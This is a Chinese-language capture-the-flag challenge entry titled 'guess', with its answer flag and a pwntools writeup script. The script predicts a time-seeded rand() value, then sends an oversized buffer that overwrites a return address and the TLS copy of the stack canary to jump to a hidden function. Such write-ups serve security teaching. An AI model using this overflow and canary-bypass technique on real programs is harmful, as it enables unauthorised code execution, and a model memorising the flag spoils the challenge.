- **题目名称：** guess
- **题目类型：** PWN
- **题目难度：** 简单
- **出题人：** she1p
- **考点：**

1. time随机数
2. TLS结构体绕canary

- **描述：** 猜中就给flag哦
- **flag：** XSCTF{W0w_y0u_Ar3_New_n3vv}
- **Writeup：**

```python
#ubuntu20.04
from pwn import *
from ctypes import *
import time
context(log_level='debug',arch='amd64',os='linux')
p=process('./guess')
dll = cdll.LoadLibrary("libc.so.6")

#p.sendlineafter('please input your choice: \n',b'1')
#p.recvuntil('the random number is : ')
#num=p.recvuntil(' \n')[:-1]
#num=num[:-1]
time_seed=int(time.time())
print(hex(time_seed))
seed = dll.srand(time_seed)
#rand_num = str(dll.rand())

rand = str(dll.rand())
print(rand)
p.sendlineafter('please input your choice: \n',b'2')
p.sendline(rand)

p.sendlineafter("Congrate! What's your name?\n",b'a'*0xa)
flag=0x40135d
pd=b'a'*0x1018+p64(flag)
pd=pd.ljust(0x1850,b'a')
p.sendlineafter('Can you give us some feedback?\n',pd)
p.interactive()
```

